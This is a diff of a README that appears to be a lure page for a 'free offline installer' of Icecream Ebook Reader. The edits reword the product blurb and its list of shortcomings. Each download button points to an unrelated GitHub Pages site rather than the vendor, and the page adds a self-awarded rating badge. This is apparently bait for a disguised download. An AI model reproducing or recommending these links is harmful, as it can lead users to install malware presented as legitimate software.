@@ -5,10 +5,10 @@
   <img src="https://img.shields.io/badge/Rating-4.9%2F5-F9A825?style=for-the-badge&logo=star" />
   <img src="https://img.shields.io/badge/Version-2026-101010?style=for-the-badge&logo=github" />
   <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20macOS-informational?style=for-the-badge&logo=windows" />
-  <img src="https://img.shields.io/badge/Category-Ebook+Reader-E63946?style=for-the-badge&logo=appstore" />
+  <img src="https://img.shields.io/badge/Category-E--Book+Reader-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Icecream Ebook Reader Free Installer** — Icecream Ebook Reader is a free Windows ebook reader supporting EPUB, MOBI, PDF, and FB2 formats. Works without internet access, no account required. Full offline installation.
+**💻 Icecream Ebook Reader Free Installer** — Icecream Ebook Reader is a free e-book reader for Windows and macOS supporting EPUB, MOBI, FB2, and PDF formats. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Icecream Ebook Reader](https://img.shields.io/badge/⬇_Install_Icecream%20Ebook%20Reader-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Icecream Ebook Reader](https://img.shields.io/badge/⬇_Install_Icecream+Ebook+Reader-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Icecream Ebook Reader
 
-Icecream Ebook Reader is a free Windows ebook reader supporting EPUB, MOBI, PDF, and FB2 formats. It provides a clean reading interface with night mode, bookmarks, dictionary lookup, and a library view for organizing your ebook collection.
+Icecream Ebook Reader is a free e-book reader for Windows and macOS supporting EPUB, MOBI, FB2, and PDF formats. Features include a night mode, customizable fonts and margins, bookmarks, and a built-in dictionary for instant word lookups. The clean interface and easy library management make it accessible for casual readers who want a straightforward e-book reading experience.
 
 ---
 
 ## ❌ Problem: Icecream Ebook Reader is hard to access
 
-- **Windows Only** — No macOS or Linux version available
-- **Basic Feature Set** — Missing advanced annotation and study features
-- **Limited Format** — Does not support all ebook formats, particularly AZW3
-- **Development Pace** — Updates arrive infrequently
+- **DRM Limitation** — Cannot open DRM-protected books without additional tools
+- **Limited Advanced Features** — Basic reading experience without study or research tools
+- **Sync** — No cross-device reading progress synchronization
+- **Update Frequency** — Updates less frequent than major e-book platforms
 
 ---
 
@@ -81,7 +81,7 @@ Icecream Ebook Reader is a free Windows ebook reader supporting EPUB, MOBI, PDF,
 
 <div align="center">
 
-[![⬇ Install Icecream Ebook Reader](https://img.shields.io/badge/⬇_Install_Icecream%20Ebook%20Reader-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Icecream Ebook Reader](https://img.shields.io/badge/⬇_Install_Icecream+Ebook+Reader-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -121,11 +121,11 @@ Icecream Ebook Reader is a free Windows ebook reader supporting EPUB, MOBI, PDF,
 
 ---
 
-**Icecream Ebook Reader Free Installer** — Icecream Ebook Reader is a free Windows ebook reader supporting EPUB, MOBI, PDF, and FB2 formats. Install without internet connection today!
+**Icecream Ebook Reader Free Installer** — Icecream Ebook Reader is a free e-book reader for Windows and macOS supporting EPUB, MOBI, FB2, and PDF formats. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Icecream Ebook Reader](https://img.shields.io/badge/⬇_Install_Icecream%20Ebook%20Reader-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Icecream Ebook Reader](https://img.shields.io/badge/⬇_Install_Icecream+Ebook+Reader-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
